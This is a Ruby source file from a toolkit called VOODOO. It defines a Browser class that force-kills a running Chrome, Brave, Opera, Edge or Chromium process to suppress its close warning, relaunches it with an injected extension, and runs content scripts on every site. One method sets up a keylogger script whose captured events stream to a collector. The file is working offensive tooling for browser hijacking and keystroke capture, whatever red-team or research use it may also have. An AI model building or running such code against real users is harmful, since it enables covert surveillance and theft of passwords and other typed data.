require 'voodoo/extension'
require 'voodoo/collector'

module VOODOO

    class Browser
        attr_reader :extension
        attr_accessor :bundle
        attr_accessor :process_name

        def initialize(bundle: nil, process_name: nil, extension: Extension.new)
            @bundle = bundle
            @extension = extension
            @process_name = process_name
            @collector_threads = []

            @extension.manifest[:permissions] = ['tabs', 'storage']
            matches = '*://*/*'
        end

        def keylogger(matches: '*://*/*', max_events: nil)
            add_script(matches: matches,
                file: File.join(__dir__, 'js/keylogger.js'),
                max_events: max_events
            ) do |event|
                yield event
            end
        end         

        def add_permissions(permissions)
            permissions = [permissions] unless permissions.is_a? Array
            @extension.manifest[:permissions] += permissions
        end

        def add_host_permissions(hosts)
            hosts = [hosts] unless hosts.is_a? Array
            @extension.manifest[:host_permissions] += hosts
        end

        def close_browser
            # kill the browser process twise, to bypass close warning
            `pkill -a -i "#{@process_name}"`
            `pkill -a -i "#{@process_name}"`
            sleep 0.2
        end

        def hijack(urls = [], flags: '')
            close_browser()

            urls = [urls] unless urls.kind_of? Array
            urls = urls.uniq
            
            `open -b "#{@bundle}" --args #{flags} --load-extension="#{@extension.save}" #{urls.shift}`

            if urls.length > 0
                sleep 0.5
                for url in urls
                    `open -b "#{@bundle}" -n -g -j --args #{url}`
                end
            end

            for thread in @collector_threads
                thread.join    
            end
        end

        def Browser.Chrome
            self.new(bundle: 'com.google.Chrome', process_name: 'Google Chrome')
        end

        def Browser.Brave
            self.new(bundle: 'com.brave.Browser', process_name: 'Brave Browser')
        end

        def Browser.Opera
            self.new(bundle: 'com.operasoftware.Opera', process_name: 'Opera')
        end

        def Browser.Edge
            self.new(bundle: 'com.microsoft.edgemac', process_name: 'Microsoft Edge')
        end

        def Browser.Chromium
            self.new(bundle: 'org.chromium.Chromium', process_name: 'Chromium')
        end

        def add_script(content: nil, file: nil, matches: nil, options: {}, background: false, max_events: nil, communication: true)
            if matches != nil && background != false
                puts 'WARNING: matches is ignored when background is set to true.'
            end

            if content == nil && file != nil
                content = File.read file
            end

            if content == nil
                raise StandardError.new(':content or :file argument are required')
            end

            event_count = 0

            if block_given? && communication == true
                collector = Collector.new(close_browser: method(:close_browser))
                collector.on_json {|jsond|
                    yield jsond
                    if (max_events != nil)
                        event_count += 1
                        if event_count >= max_events.to_i
                            collector.thread.kill
                        end
                    end
                }
                @collector_threads.push(collector.thread)
                options[:collector_url] = collector.url
            end

            options.keys.each do |key|
                options[(key.to_sym rescue key) || key] = options.delete(key)
            end

            voodoo_js = File.read(File.join(__dir__, 'js/voodoo.js'))
            content = voodoo_js + "\n" + content

            # find variables
            variables = content.scan(/%{[a-z_0-9]+}/i)
            
            for var in variables
                # remove %{}
                var_sym = var[2...(var.length)-1].to_sym
                if !options[var_sym]
                    # when option is missing set it to nil
                    options[var_sym] = nil
                else
                    if !options[var_sym].kind_of? String
                        content = content.gsub("\"#{var}\"", var)
                        options[var_sym] = JSON.generate(options[var_sym])
                    end
                end
            end

            content = content % options
            
            if background == true
                return @extension.add_service_worker(content: content)
            else
                if matches == nil
                    matches = '*://*/*'
                end
                return @extension.add_content_script(matches, js: [content])
            end
        end
    end

end